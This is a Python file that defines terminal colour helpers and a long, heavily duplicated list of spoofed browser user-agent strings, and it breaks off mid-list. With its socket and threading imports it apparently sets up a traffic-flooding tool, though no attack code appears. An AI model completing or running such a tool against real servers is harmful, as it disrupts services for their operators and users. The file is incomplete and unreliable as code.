from ipaddress import ip_address
import os, time, random, threading, socket
from colorama import Fore
import threading, socket, random, time

class Color:
    def __init__(self):
        # Styles
        self.invisible = '\033[30;40;196m'
        self.underline = '\033[4m'
        self.bright =  '\033[1;4m'
        self.reset =   '\033[0m'

        # Colors
        self.white   = self.rgb(255, 255, 255)
        self.magenta = self.rgb(249, 53, 248) 
        self.yellow  = self.rgb(216, 235, 52)
        self.orange  = self.rgb(255, 99, 71)
        self.blue_m  = self.rgb(88, 5, 255)
        self.green   = self.rgb(0, 255, 0)
        self.red     = self.rgb(255, 0, 0)

    def rgb(self, r: int, g: int, b: int):
        return '\033[38;2;<r>;<g>;<b>m'.replace('<r>', str(r)).replace('<g>', str(g)).replace('<b>', str(b))

    def fade(self, text: str):
        final = ''
        i= 0
        
        for char in text:
            i+= 4
            final += f'{self.rgb(200, 60, i)}{char}' # Original ~> 200, 60, i
        
        return final

useragents = [
     'Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1', 'Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1', 'Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0',
     'Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1',
     'Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2',
     'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0',
     'Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0',
     'Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b4pre) Gecko/20100815 Minefield/4.0b4pre',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110622 Firefox/6.0a2',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1',
     'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3',
     'Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0',
     'Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)',
     'Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.23) Gecko/20090825 SeaMonkey/1.1.18',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; tr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729; .NET4.0E)',
     'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.310.0 Safari/532.9',
     'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/533.17.8 (KHTML, like Gecko) Version/5.0.1 Safari/533.17.8',
     'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.11) Gecko/2009060215 Firefox/3.0.11 (.NET CLR 3.5.30729)', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: )', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/9.0.601.0 Safari/534.14', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 GTB5', 'Mozilla/5.0 (Windows; U; Windows NT 6.0 x64; en-US; rv:1.9pre) Gecko/2008072421 Minefield/3.0.2pre', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.1.17) Gecko/20110123 (like Firefox/3.x) SeaMonkey/2.0.12', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.249.0 Safari/532.8',
     'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/10.0.601.0 Safari/534.14', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20', 'Mozilla/5.0 (Windows; U; Windows XP) Gecko MultiZilla/1.6.1.0a', 'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.2b) Gecko/20021001 Phoenix/0.2', 'Mozilla/5.0 (X11; FreeBSD amd64; rv:5.0) Gecko/20100101 Firefox/5.0', 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.34 (KHTML, like Gecko) QupZilla/1.2.0 Safari/534.34',
     'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/11.04 Chromium/14.0.825.0 Chrome/14.0.825.0 Safari/535.1',
     'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.2 (KHTML, like Gecko) Ubuntu/11.10 Chromium/15.0.874.120 Chrome/15.0.874.120 Safari/535.2',
     'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1', 'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (X11; Linux i686; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1',
     'Mozilla/5.0 (X11; Linux i686; rv:12.0) Gecko/20100101 Firefox/12.0 ',
     'Mozilla/5.0 (X11; Linux i686; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (X11; Linux i686; rv:2.0b6pre) Gecko/20100907 Firefox/4.0b6pre',
     'Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0',
     'Mozilla/5.0 (X11; Linux i686; rv:6.0a2) Gecko/20110615 Firefox/6.0a2 Iceweasel/6.0a2', 'Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20100101 Firefox/6.0', 'Mozilla/5.0 (X11; Linux i686; rv:8.0) Gecko/20100101 Firefox/8.0', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Ubuntu/10.10 Chromium/12.0.703.0 Chrome/12.0.703.0 Safari/534.24',
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.20 Safari/535.1',
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5',
     'Mozilla/5.0 (X11; Linux x86_64; en-US; rv:2.0b2pre) Gecko/20100712 Minefield/4.0b2pre',
     'Mozilla/5.0 (X11; Linux x86_64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1',
     'Mozilla/5.0 (X11; Linux x86_64; rv:11.0a2) Gecko/20111230 Firefox/11.0a2 Iceweasel/11.0a2',
     'Mozilla/5.0 (X11; Linux x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (X11; Linux x86_64; rv:2.2a1pre) Gecko/20100101 Firefox/4.2a1pre',
     'Mozilla/5.0 (X11; Linux x86_64; rv:5.0) Gecko/20100101 Firefox/5.0 Iceweasel/5.0',
     'Mozilla/5.0 (X11; Linux x86_64; rv:7.0a1) Gecko/20110623 Firefox/7.0a1',
     'Mozilla/5.0 (X11; U; FreeBSD amd64; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0',
     'Mozilla/5.0 (X11; U; FreeBSD i386; de-CH; rv:1.9.2.8) Gecko/20100729 Firefox/3.6.8',
     'Mozilla/5.0 (X11; U; FreeBSD i386; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0',
     'Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.6) Gecko/20040406 Galeon/1.3.15',
     'Mozilla/5.0 (X11; U; FreeBSD; i386; en-US; rv:1.7) Gecko',
     'Mozilla/5.0 (X11; U; FreeBSD x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16',
     'Mozilla/5.0 (X11; U; Linux arm7tdmi; rv:1.8.1.11) Gecko/20071130 Minimo/0.025',
     'Mozilla/5.0 (X11; U; Linux armv61; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1',
     'Mozilla/5.0 (X11; U; Linux armv6l; rv 1.8.1.5pre) Gecko/20070619 Minimo/0.020',
     'Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.10.1',
     'Mozilla/5.0 (X11; U; Linux i586; en-US; rv:1.7.3) Gecko/20040924 Epiphany/1.4.4 (Ubuntu)',
     'Mozilla/5.0 (X11; U; Linux i686; en-us) AppleWebKit/528.5  (KHTML, like Gecko, Safari/528.5 ) lt-GtkLauncher',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.4 (KHTML, like Gecko) Chrome/4.0.237.0 Safari/532.4 Debian',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.277.0 Safari/532.8',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Ubuntu/10.10 Chromium/10.0.613.0 Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040614 Firefox/0.8',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Debian/1.6-7',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Epiphany/1.2.8',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Galeon/1.3.14',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7 MG(Novarra-Vision/6.9)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.16) Gecko/20080716 (Gentoo) Galeon/2.0.6',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1) Gecko/20061024 Firefox/2.0 (Swiftfox)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.11) Gecko/2009060309 Ubuntu/9.10 (karmic) Firefox/3.0.11',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Galeon/2.0.6 (Ubuntu 2.0.6-2)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.16) Gecko/20120421 Gecko Firefox/11.0',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.2) Gecko/20090803 Ubuntu/9.04 (jaunty) Shiretoko/3.5.2',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9a3pre) Gecko/20070330',
     'Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.2.3) Gecko/20100406 Firefox/3.6.3 (Swiftfox)',
     'Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.2) Gecko/20121223 Ubuntu/9.25 (jaunty) Firefox/3.8',
     'Mozilla/5.0 (X11; U; Linux i686; pt-PT; rv:1.9.2.3) Gecko/20100402 Iceweasel/3.6.3 (like Firefox/3.6.3) GTB7.0',
     'Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.8.1.13) Gecko/20080313 Iceape/1.1.9 (Debian-1.1.9-5)',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.3) Gecko/2008092814 (Debian-3.0.1-1)',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.13) Gecko/20100916 Iceape/2.0.8',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.17) Gecko/20110123 SeaMonkey/2.0.12',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20091020 Linux Mint/8 (Helena) Firefox/3.5.3',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.5) Gecko/20091107 Firefox/3.5.5',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.9) Gecko/20100915 Gentoo Firefox/3.6.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; sv-SE; rv:1.8.1.12) Gecko/20080207 Ubuntu/7.10 (gutsy) Firefox/2.0.0.12',
     'Mozilla/5.0 (X11; U; Linux x86_64; us; rv:1.9.1.19) Gecko/20110430 shadowfox/7.0 (like Firefox/7.0',
     'Mozilla/5.0 (X11; U; NetBSD amd64; en-US; rv:1.9.2.15) Gecko/20110308 Namoroka/3.6.15',
     'Mozilla/5.0 (X11; U; OpenBSD arm; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0',
     'Mozilla/5.0 (X11; U; OpenBSD i386; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.359.0 Safari/533.3',
     'Mozilla/5.0 (X11; U; OpenBSD i386; en-US; rv:1.9.1) Gecko/20090702 Firefox/3.5',
     'Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.8.1.12) Gecko/20080303 SeaMonkey/1.1.8',
     'Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.9.1b3) Gecko/20090429 Firefox/3.1b3',
     'Mozilla/5.0 (X11; U; SunOS sun4m; en-US; rv:1.4b) Gecko/20030517 Mozilla Firebird/0.6',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7', 'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0', 'Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043807 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN', 'Mozilla/5.0 (Linux; Android 7.1.1; OD103 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 6.0.1; SM919 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 5.1.1; vivo X6S A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 5.1; HUAWEI TAG-AL00 Build/HUAWEITAG-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043622 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13F69 MicroMessenger/6.6.1 NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_2 like Mac https://m.baidu.com/mip/c/s/zhangzifan.com/wechat-user-agent.htmlOS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C202 MicroMessenger/6.6.1 NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Mobile/15B150 MicroMessenger/6.6.1 NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (iphone x Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0',
     'Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1',
     'Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2',
     'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0',
     'Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0',
     'Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b4pre) Gecko/20100815 Minefield/4.0b4pre',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110622 Firefox/6.0a2',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1',
     'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3',
     'Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0',
     'Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)',
     'Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.23) Gecko/20090825 SeaMonkey/1.1.18',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; tr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729; .NET4.0E)',
     'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.310.0 Safari/532.9',
     'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/533.17.8 (KHTML, like Gecko) Version/5.0.1 Safari/533.17.8',
     'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.11) Gecko/2009060215 Firefox/3.0.11 (.NET CLR 3.5.30729)', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: )', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/9.0.601.0 Safari/534.14', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 GTB5', 'Mozilla/5.0 (Windows; U; Windows NT 6.0 x64; en-US; rv:1.9pre) Gecko/2008072421 Minefield/3.0.2pre', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.1.17) Gecko/20110123 (like Firefox/3.x) SeaMonkey/2.0.12', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.249.0 Safari/532.8',
     'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/10.0.601.0 Safari/534.14', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20', 'Mozilla/5.0 (Windows; U; Windows XP) Gecko MultiZilla/1.6.1.0a', 'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.2b) Gecko/20021001 Phoenix/0.2', 'Mozilla/5.0 (X11; FreeBSD amd64; rv:5.0) Gecko/20100101 Firefox/5.0', 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.34 (KHTML, like Gecko) QupZilla/1.2.0 Safari/534.34',
     'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/11.04 Chromium/14.0.825.0 Chrome/14.0.825.0 Safari/535.1',
     'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.2 (KHTML, like Gecko) Ubuntu/11.10 Chromium/15.0.874.120 Chrome/15.0.874.120 Safari/535.2',
     'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1', 'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (X11; Linux i686; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1',
     'Mozilla/5.0 (X11; Linux i686; rv:12.0) Gecko/20100101 Firefox/12.0 ',
     'Mozilla/5.0 (X11; Linux i686; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (X11; Linux i686; rv:2.0b6pre) Gecko/20100907 Firefox/4.0b6pre',
     'Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0',
     'Mozilla/5.0 (X11; Linux i686; rv:6.0a2) Gecko/20110615 Firefox/6.0a2 Iceweasel/6.0a2', 'Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20100101 Firefox/6.0', 'Mozilla/5.0 (X11; Linux i686; rv:8.0) Gecko/20100101 Firefox/8.0', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Ubuntu/10.10 Chromium/12.0.703.0 Chrome/12.0.703.0 Safari/534.24',
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.20 Safari/535.1',
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5',
     'Mozilla/5.0 (X11; Linux x86_64; en-US; rv:2.0b2pre) Gecko/20100712 Minefield/4.0b2pre',
     'Mozilla/5.0 (X11; Linux x86_64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1',
     'Mozilla/5.0 (X11; Linux x86_64; rv:11.0a2) Gecko/20111230 Firefox/11.0a2 Iceweasel/11.0a2',
     'Mozilla/5.0 (X11; Linux x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (X11; Linux x86_64; rv:2.2a1pre) Gecko/20100101 Firefox/4.2a1pre',
     'Mozilla/5.0 (X11; Linux x86_64; rv:5.0) Gecko/20100101 Firefox/5.0 Iceweasel/5.0',
     'Mozilla/5.0 (X11; Linux x86_64; rv:7.0a1) Gecko/20110623 Firefox/7.0a1',
     'Mozilla/5.0 (X11; U; FreeBSD amd64; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0',
     'Mozilla/5.0 (X11; U; FreeBSD i386; de-CH; rv:1.9.2.8) Gecko/20100729 Firefox/3.6.8',
     'Mozilla/5.0 (X11; U; FreeBSD i386; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0',
     'Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.6) Gecko/20040406 Galeon/1.3.15',
     'Mozilla/5.0 (X11; U; FreeBSD; i386; en-US; rv:1.7) Gecko',
     'Mozilla/5.0 (X11; U; FreeBSD x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16',
     'Mozilla/5.0 (X11; U; Linux arm7tdmi; rv:1.8.1.11) Gecko/20071130 Minimo/0.025',
     'Mozilla/5.0 (X11; U; Linux armv61; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1',
